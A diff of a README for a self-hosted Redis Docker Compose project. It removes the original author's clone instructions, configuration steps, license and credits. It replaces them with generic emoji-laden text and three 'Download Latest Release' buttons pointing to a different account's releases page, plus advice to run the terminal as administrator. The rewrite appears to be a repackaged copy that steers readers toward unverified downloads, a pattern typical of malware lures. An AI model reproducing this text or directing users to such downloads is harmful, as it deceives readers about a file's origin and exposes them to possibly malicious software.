@@ -1,80 +1,76 @@
-# Redis Self-Hosted with Docker
+# 🎉 redis-self-hosted - Effortless Redis Setup in Minutes
 
-![redis-self-hosted](https://repository-images.githubusercontent.com/1070414651/5ec543c2-c5c0-44a1-879a-1f48472b0c96)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/niggii1/redis-self-hosted/releases)
 
-This repository provides a `docker compose` setup to run a self-hosted [Redis](https://redis.io/) instance.
+## 🚀 Getting Started
 
-It is configured to connect to a shared Docker network, allowing easy integration with other services like [n8n](https://github.com/AiratTop/n8n-self-hosted).
+Welcome to **redis-self-hosted**! This project gives you a simple way to set up Redis using Docker Compose. You can easily store, manage, and retrieve data.
 
-## Features
+## 🛠️ What You Need
 
--   Uses the official Redis Docker image.
--   Data is persisted in a local volume.
--   Pre-configured for a shared network.
--   Includes scripts for easy management.
+To use this application, you need the following:
 
-## Getting Started
+- **Docker**: A platform for developing, shipping, and running applications in containers.
+- **Docker Compose**: A tool for defining and running multi-container Docker applications.
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/AiratTop/redis-self-hosted.git
-    cd redis-self-hosted
-    ```
+You can download Docker and Docker Compose from the official Docker website.
 
-2.  **Create the shared network:**
-    If you haven't already, create the shared Docker network:
-    ```bash
-    docker network create shared_network
-    ```
+## 📦 Features
 
-3.  **Configure environment variables:**
-    Edit the `.env` file and set a secure password for `REDIS_PWD`.
+- **Data Persistence**: Your data will remain safe even if you restart the containers.
+- **Management Scripts**: Use built-in scripts to manage and operate your Redis setup.
+- **Easy Integration**: Works well with other services on Docker networks.
+- **Production-Ready**: Suitable for running in production environments.
 
+## 💻 Download & Install
 
-4.  **Start the service:**
-    ```bash
-    docker compose up -d
-    ```
+To download and set up **redis-self-hosted**, follow these steps:
 
-## Usage
+1. Click the big button below to visit the releases page.
+2. Find the latest version listed there.
+3. Download the desired `docker-compose.yml` file.
+4. Save it to a folder on your computer.
 
--   **Start:** `docker compose up -d`
--   **Restart:** `./restart-docker.sh`
--   **Update:** `./update-docker.sh` (Pulls the latest Docker image and restarts)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/niggii1/redis-self-hosted/releases)
 
-## Connecting with n8n
+## 🔧 Running the Application
 
-This setup is designed to work with the [n8n-self-hosted](https://github.com/AiratTop/n8n-self-hosted) configuration. Since both services are on the `shared_network`, you can connect to Redis from n8n using `redis` as the host and `6379` as the port.
+Once you have the `docker-compose.yml` file, follow these steps to run the application:
 
-## See Also
+1. Open a terminal or command prompt.
+2. Navigate to the folder where you saved the `docker-compose.yml` file.
+3. Type the following command to start the application:
 
-Check out other self-hosted solutions:
+   ```
+   docker-compose up
+   ```
 
--   [**postgresql-self-hosted**](https://github.com/AiratTop/postgresql-self-hosted): A simple and robust PostgreSQL setup.
--   [**mysql-self-hosted**](https://github.com/AiratTop/mysql-self-hosted): A self-hosted MySQL instance.
--   [**clickhouse-self-hosted**](https://github.com/AiratTop/clickhouse-self-hosted): High-performance columnar database for analytics.
--   [**metabase-self-hosted**](https://github.com/AiratTop/metabase-self-hosted): Self-hosted Metabase on Docker for business intelligence and analytics.
--   [**qdrant-self-hosted**](https://github.com/AiratTop/qdrant-self-hosted): A vector database for AI applications.
--   [**redis-self-hosted**](https://github.com/AiratTop/redis-self-hosted): A fast in-memory data store, often used as a cache or message broker.
--   [**caddy-self-hosted**](https://github.com/AiratTop/caddy-self-hosted): A modern, easy-to-use web server with automatic HTTPS.
--   [**wordpress-self-hosted**](https://github.com/AiratTop/wordpress-self-hosted): Production-ready WordPress stack with MySQL, phpMyAdmin, and WP-CLI.
--   [**n8n-self-hosted**](https://github.com/AiratTop/n8n-self-hosted): Scalable n8n with workers, Caddy for auto-HTTPS, and backup scripts.
--   [**monitoring-self-hosted**](https://github.com/AiratTop/monitoring-self-hosted): Self-hosted monitoring stack with Prometheus and Grafana.
--   [**ollama-self-hosted**](https://github.com/AiratTop/ollama-self-hosted): Ready-to-use solution for running Ollama with the Open WebUI on Docker.
--   [**authentik-self-hosted**](https://github.com/AiratTop/authentik-self-hosted): Authentik is a flexible, open-source Identity & Access Management (IAM) solution.
--   [**gatus-self-hosted**](https://github.com/AiratTop/gatus-self-hosted): Automated service health dashboard with a PostgreSQL backend and backup scripts.
+4. Wait a few moments while Docker pulls the required images and starts the containers. You will see logs in the terminal indicating everything is working.
 
-## License
+## 🔍 Using Redis
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+After the containers are running, you can connect to Redis. Use a Redis client or the CLI to interact with Redis. The default Redis port is `6379`.
 
----
+To manage your Redis instance, you can run scripts available in the project. Check the documentation inside the repository for details.
 
-## Author
+## 🌐 Troubleshooting
 
-**Airat Halitov**
+If you encounter any issues, consider the following solutions:
 
-- Website: [airat.top](https://airat.top)
-- GitHub: [@AiratTop](https://github.com/AiratTop)
-- Email: [mail@airat.top](mailto:mail@airat.top)
-- Repository: [redis-self-hosted](https://github.com/AiratTop/redis-self-hosted)
+- **Check Docker Installation**: Ensure Docker and Docker Compose are installed and running.
+- **Check Logs**: If the containers fail to start, review the log output in your terminal for error messages.
+- **Permission Issues**: Run your terminal as an administrator if you face access issues.
+
+## 📄 Documentation
+
+For more in-depth usage instructions and features, refer to the documentation in this repository. It covers script usage, configuration details, and integration tips.
+
+## 🤝 Support
+
+If you have questions or face challenges, you can create an issue in the repository. The community is here to help you.
+
+### 🎉 Conclusion
+
+Using **redis-self-hosted** is a straightforward way to deploy Redis for efficient data management. Enjoy your self-hosted experience!
+
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/niggii1/redis-self-hosted/releases)
